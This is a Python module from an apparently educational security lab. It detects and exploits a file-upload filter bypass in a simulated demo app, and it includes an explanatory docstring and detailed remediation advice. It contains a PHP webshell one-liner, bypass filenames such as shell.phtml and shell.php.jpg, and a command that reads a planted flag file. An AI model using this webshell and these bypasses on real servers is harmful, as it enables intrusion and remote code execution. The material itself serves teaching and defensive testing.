r"""File-upload filter bypass -> stored webshell -> RCE.

WHAT IT IS
----------
The demo app lets a user upload a file (``POST /upload`` with JSON
``{"filename", "content", "content_type"}``) and serves it back from
``GET /uploads/<name>``. The developer "secured" the upload against PHP
webshells with two checks, and *both* are wrong because they validate a
**spelling** rather than what the server will actually do with the file::

    def _upload(h):                                       # POST /upload
        filename = data.get("filename", "")
        if filename.lower().endswith(".php"):             # naive extension filter
            return 400  "php files are not allowed"
        if data.get("content_type", "").lower() in (      # naive MIME blocklist
                "application/x-php", "application/php", "text/x-php"):
            return 400  "php content-type blocked"
        h.state.uploads[filename] = data.get("content", "")  # else: STORE verbatim

Two independent flaws make this trivially bypassable:

1.  **The extension filter only matches the single, lowercase literal
    ``.php`` at the very end of the name.** A real PHP runtime executes a
    much larger family of extensions -- ``.phtml``, ``.php3/4/5/7``,
    ``.pht``, ``.phar`` -- because they are wired to the PHP handler in the
    web-server config (e.g. Apache ``AddHandler``/``AddType`` or an nginx
    ``location ~ \.php``). The blocklist forgot every one of those. And a
    **double extension** like ``shell.php.jpg`` does not *end* in ``.php``,
    so it sails past ``endswith(".php")`` -- yet a misconfigured Apache with
    ``AddHandler application/x-httpd-php .php`` (which matches ``.php``
    *anywhere* in the name, not just last) will still hand it to PHP.

2.  **The MIME filter trusts the client-supplied ``Content-Type``.** That
    value is attacker-controlled; sending ``image/jpeg`` (or anything not on
    the tiny blocklist) walks straight past it. Server-side MIME sniffing of
    the *bytes* would be only marginally better -- the real fix is to never
    let the upload directory execute code at all.

The lab models the execution faithfully: ``GET /uploads/<name>`` decides
whether the stored file is "code" with the same broken family check the
real PHP handler uses (any of ``php phtml php3 php4 php5 php7 phar pht`` as
*any* dotted component), and if so it "runs" it -- ``?cmd=`` is passed to a
simulated shell, exactly as ``<?php system($_GET['cmd']); ?>`` would. A
plain ``pic.jpg`` is returned verbatim (never executed), proving the
upload+serve path is benign until the *bypass* makes the server treat our
upload as code. The webshell prize is :data:`C.FLAGS["file_upload"]`,
recovered by running ``cat secret/upload_flag.txt`` through the shell.

HOW WE DISCOVER IT
------------------
Three differential signals confirm a real, exploitable filter bypass:

1.  **The literal ``.php`` is blocked (control #1).** ``POST /upload`` with
    ``filename="shell.php"`` returns HTTP 400 ("php files are not allowed").
    Proof an extension filter exists -- the developer tried to stop webshells.
2.  **A PHP ``Content-Type`` is blocked (control #2).** Uploading with
    ``content_type="application/x-php"`` returns HTTP 400. Proof a second,
    MIME-based guard exists, so reaching code execution is a *bypass* of two
    controls, not the intended behaviour.
3.  **A bypass filename STORES and then EXECUTES (the exploit signal).**
    ``shell.phtml`` / ``shell.php5`` / ``shell.pht`` / ``shell.php.jpg`` are
    each accepted (HTTP 200, ``stored``), and ``GET /uploads/<name>?cmd=...``
    returns the command's output in a ``<pre>`` -- the server executed our
    uploaded webshell. That stored-then-executed differential *is* the vuln.

HOW WE EXPLOIT IT
-----------------
For each bypass filename we (a) upload a webshell body
(``<?php system($_GET['cmd']); ?>``) with a benign ``image/jpeg``
content-type, confirm it stored, then (b) ``GET /uploads/<name>`` with
``cmd=cat secret/upload_flag.txt`` and scrape the flag out of the returned
``<pre>``. We try every bypass filename and report which ones achieved RCE,
recovering the flag from the first that worked.

THE FIX
-------
See :data:`REMEDIATION`. In one line: never decide executability from a
blocklist of spellings or a client-supplied MIME type -- store uploads
outside the web root (or in a bucket served with a forced ``Content-Type``
+ ``Content-Disposition: attachment``) under a random server-generated name
with a single allow-listed extension, and make the upload directory
incapable of executing code.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Treat every uploaded file as hostile and never let the upload location "
    "execute code. Do NOT validate uploads with an extension BLOCKLIST -- "
    "blocklists miss the whole PHP-executable family (.phtml, .php3, .php4, "
    ".php5, .php7, .pht, .phar) and are defeated by double extensions "
    "(shell.php.jpg), trailing dots/spaces (shell.php. , shell.php%20), case "
    "(shell.PHP), null bytes (shell.php%00.jpg on old stacks), and alternate "
    "data streams on Windows. Do NOT trust the client-supplied Content-Type: "
    "it is attacker-controlled, so a MIME blocklist is bypassed by simply "
    "sending image/jpeg. Instead: (1) store uploads OUTSIDE the web root (or "
    "in object storage) so a stored .php can never be requested as a script; "
    "(2) serve them only through a handler that streams the bytes with a "
    "forced safe Content-Type and 'Content-Disposition: attachment' and "
    "'X-Content-Type-Options: nosniff' so the browser/engine never executes "
    "them; (3) generate a RANDOM server-side filename and append exactly one "
    "ALLOW-LISTED extension (allow-list, never block-list) chosen from a fixed "
    "set, derived from server-side content sniffing (magic bytes) -- never "
    "from the user's filename or Content-Type; (4) configure the upload "
    "directory to be non-executable: in Apache disable PHP there (php_admin_flag "
    "engine off, RemoveHandler/RemoveType, or no AddHandler), in nginx ensure "
    "no 'location ~ \\.php' matches it and don't proxy it to php-fpm, and remove "
    "any AddHandler that matches an extension ANYWHERE in the name rather than "
    "only at the end; (5) re-encode/transcode images server-side to strip "
    "polyglot/embedded code; and (6) as defence in depth, run the app under a "
    "least-privileged user, enforce size/type quotas, and scan uploads. "
    "Allow-list, randomise, store-outside-webroot, and make-non-executable -- "
    "never blocklist a filename or trust a client MIME type."
)

#: The upload sink (POST) and the serve-and-execute sink (GET), shown in reports.
UPLOAD_ENDPOINT: str = "/upload"
SERVE_ENDPOINT: str = "/uploads/"

#: The Finding endpoint -- the upload surface whose filter we bypass.
ENDPOINT: str = "/upload (filename filter) -> /uploads/<name>"

#: The webshell body we store. In a real target this is the PHP one-liner that
#: turns the stored file into a command runner; here the simulated PHP handler
#: feeds ?cmd= to a sandboxed shell, so the body proves intent + is realistic.
WEBSHELL_BODY: str = "<?php system($_GET['cmd']); ?>"

#: A benign-looking content-type that walks past the MIME blocklist (the value
#: is attacker-controlled, so any non-blocklisted string works).
BYPASS_CONTENT_TYPE: str = "image/jpeg"

#: The shell command the webshell runs to read the planted RCE-proof file.
EXPLOIT_CMD: str = "cat secret/upload_flag.txt"

#: Controls that prove a filter exists (each expected to be rejected, HTTP 400).
BLOCKED_PHP_FILENAME: str = "shell.php"            # literal .php extension -> 400
BLOCKED_CONTENT_TYPE: str = "application/x-php"    # php MIME -> 400

#: The bypass filenames, each defeating the naive ``endswith(".php")`` filter while
#: still being executed by the (mis)configured PHP handler. Alternate executable
#: extensions + one double-extension. Labelled for the report.
BYPASS_FILENAMES: List[Tuple[str, str]] = [
    ("phtml-extension", "shell.phtml"),       # .phtml is PHP-executable, not ".php"
    ("php5-extension", "shell.php5"),         # .php5 ditto
    ("pht-extension", "shell.pht"),           # .pht ditto (short Apache form)
    ("double-extension", "shell.php.jpg"),    # ends in .jpg, but a 'php' component runs
]

#: Every filename the engine submits to the upload sink (public so the CLI/report
#: can show what was attempted): the blocked control + the bypasses.
PAYLOADS: List[str] = [BLOCKED_PHP_FILENAME] + [name for _label, name in BYPASS_FILENAMES]


# --- low-level probes --------------------------------------------------------
def _upload(
    client: WebClient,
    filename: str,
    content: str = WEBSHELL_BODY,
    content_type: str = BYPASS_CONTENT_TYPE,
) -> Response:
    """Drive the upload sink: ``POST /upload`` with the webshell body."""
    return client.post(
        UPLOAD_ENDPOINT,
        json={"filename": filename, "content": content, "content_type": content_type},
    )


def _serve(client: WebClient, filename: str, cmd: str = EXPLOIT_CMD) -> Response:
    """Request the stored file; a webshell name passes ``?cmd=`` to the handler."""
    return client.get(SERVE_ENDPOINT + filename, params={"cmd": cmd})


def _stored_ok(resp: Response, filename: str) -> bool:
    """True if the upload was accepted (HTTP 200 echoing the stored filename)."""
    if resp.status != 200:
        return False
    try:
        body = resp.json()
    except ValueError:
        return False
    return isinstance(body, dict) and body.get("stored") == filename


def _flag_from_exec(resp: Response) -> Optional[str]:
    """Extract the planted flag from an executed-webshell response (a ``<pre>``)."""
    if resp.status == 200 and C.FLAGS["file_upload"] in resp.text:
        return C.FLAGS["file_upload"]
    return None


# --- detection (controls that prove the filter exists and is being bypassed) -
def detect_php_extension_blocked(
    client: WebClient, filename: str = BLOCKED_PHP_FILENAME
) -> Tuple[bool, str]:
    """Control #1: the literal ``.php`` extension is rejected (HTTP 400).

    ``POST /upload`` with ``filename="shell.php"`` returns 400 ("php files are
    not allowed") and stores nothing -- proof an extension filter exists, so
    getting code execution another way is a bypass.
    """
    resp = _upload(client, filename)
    if resp.status == 400 and C.FLAGS["file_upload"] not in resp.text:
        return True, (
            f"POST {UPLOAD_ENDPOINT} filename={filename!r} was rejected (HTTP "
            f"{resp.status}) -- a naive endswith('.php') extension filter exists"
        )
    return False, ""


def detect_content_type_blocked(
    client: WebClient, content_type: str = BLOCKED_CONTENT_TYPE
) -> Tuple[bool, str]:
    """Control #2: a PHP ``Content-Type`` is rejected (HTTP 400).

    Uploading with ``content_type="application/x-php"`` (under a non-.php name,
    so only the MIME guard can fire) returns 400 -- proof a second, MIME-based
    guard exists, so reaching RCE is a bypass of TWO controls.
    """
    resp = _upload(client, "shell.txt", content_type=content_type)
    if resp.status == 400 and C.FLAGS["file_upload"] not in resp.text:
        return True, (
            f"POST {UPLOAD_ENDPOINT} content_type={content_type!r} was rejected "
            f"(HTTP {resp.status}) -- a client-supplied-MIME blocklist exists too"
        )
    return False, ""


def detect_bypass(client: WebClient) -> Tuple[bool, List[Tuple[str, str]], str]:
    """The exploit signal: at least one bypass filename STORES then EXECUTES.

    For each filename in :data:`BYPASS_FILENAMES`, upload the webshell, confirm it
    stored, then request it with ``?cmd=`` and check the planted flag appears in the
    returned ``<pre>``. Returns ``(any_worked, working, evidence)`` where ``working``
    is the list of ``(label, filename)`` that achieved RCE.
    """
    working: List[Tuple[str, str]] = []
    for label, filename in BYPASS_FILENAMES:
        if not _stored_ok(_upload(client, filename), filename):
            continue
        if _flag_from_exec(_serve(client, filename)) == C.FLAGS["file_upload"]:
            working.append((label, filename))
    if working:
        forms = ", ".join(f"{label} ({name})" for label, name in working)
        evidence = (
            f"{len(working)}/{len(BYPASS_FILENAMES)} bypass filenames stored AND "
            f"executed via GET {SERVE_ENDPOINT}<name>?cmd=...: {forms} -- each "
            "defeats endswith('.php') yet is run by the PHP handler"
        )
        return True, working, evidence
    return False, [], ""


# --- exploitation ------------------------------------------------------------
def exploit_upload_webshell(
    client: WebClient,
) -> Tuple[bool, Optional[str], List[Dict[str, str]], str]:
    """Upload + execute a webshell via each bypass filename; recover the flag.

    Returns ``(ok, flag, attempts, output)`` where ``attempts`` records each
    filename tried with its store/exec status (for the report) and ``output`` is
    the raw ``<pre>`` body of the first webshell that ran (the RCE evidence).
    """
    attempts: List[Dict[str, str]] = []
    flag: Optional[str] = None
    output: str = ""
    for label, filename in BYPASS_FILENAMES:
        up = _upload(client, filename)
        stored = _stored_ok(up, filename)
        executed = False
        if stored:
            served = _serve(client, filename)
            got = _flag_from_exec(served)
            executed = got == C.FLAGS["file_upload"]
            if executed and flag is None:
                flag = got
                output = served.text
        attempts.append(
            {
                "label": label,
                "filename": filename,
                "upload_status": str(up.status),
                "stored": str(stored),
                "executed": str(executed),
            }
        )
    ok = flag == C.FLAGS["file_upload"]
    return ok, flag, attempts, output


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the upload filter bypass, then exploit it (recover the planted flag).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["file_upload"]`` and which bypass filenames achieved RCE, with ``extra``
    proving the bypass was real: ``shell.php`` is 400 and ``application/x-php`` is 400,
    yet a bypass filename stores and then executes our webshell.
    """
    techniques: List[str] = []

    # 1) Detection / controls ----------------------------------------------
    php_ok, php_ev = detect_php_extension_blocked(client)
    if php_ok:
        techniques.append("php-extension-blocked-400")
    ct_ok, ct_ev = detect_content_type_blocked(client)
    if ct_ok:
        techniques.append("php-content-type-blocked-400")
    bypass_ok, working, bypass_ev = detect_bypass(client)
    if bypass_ok:
        techniques.append("bypass-stored-and-executed")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, attempts, output = exploit_upload_webshell(client)
    if ok:
        techniques.append("recover-flag")

    # Discovery requires the bypass to have produced the flag AND the controls to
    # prove a filter was present and being bypassed (both guards return 400).
    discovered = bool(bypass_ok and ok and php_ok and ct_ok)

    working_labels = [label for label, _name in working]
    working_names = [name for _label, name in working]
    first_working = working_names[0] if working_names else ""

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if php_ok:
        evidence_parts.append(f"php-extension-blocked: {php_ev}")
    if ct_ok:
        evidence_parts.append(f"php-content-type-blocked: {ct_ev}")
    if bypass_ok:
        evidence_parts.append(f"bypass: {bypass_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "flag": flag,
        "payload": first_working,
        "webshell_body": WEBSHELL_BODY,
        "exploit_cmd": EXPLOIT_CMD,
        "bypass_filenames": working_labels,
        "working_filenames": working_names,
        "blocked_php_filename": BLOCKED_PHP_FILENAME,
        "blocked_content_type": BLOCKED_CONTENT_TYPE,
        "webshell_output": output,
        "attempts": attempts,
        "techniques": techniques,
        "summary": (
            f"the filter 400'd the literal {BLOCKED_PHP_FILENAME!r} and the "
            f"{BLOCKED_CONTENT_TYPE!r} content-type, but {len(working)} bypass "
            f"filename(s) ({', '.join(working_names)}) were stored and executed as a "
            f"webshell; ran {EXPLOIT_CMD!r} via GET {SERVE_ENDPOINT}{first_working}"
            f"?cmd=... and recovered flag {flag!r} -- a stored-webshell RCE"
        ),
    }

    return Finding(
        vuln="File Upload Filter Bypass (stored webshell -> RCE)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=first_working,
        extra={
            "techniques": techniques,
            "php_extension_blocked": php_ok,
            "php_extension_blocked_status": 400,
            "content_type_blocked": ct_ok,
            "content_type_blocked_status": 400,
            "bypass_executed": bypass_ok,
            "flag_recovered": ok,
            "bypass_filenames": working_labels,
            "working_filenames": working_names,
            "blocked_php_filename": BLOCKED_PHP_FILENAME,
            "blocked_content_type": BLOCKED_CONTENT_TYPE,
            "exploit_cmd": EXPLOIT_CMD,
            "attempts": attempts,
        },
    )
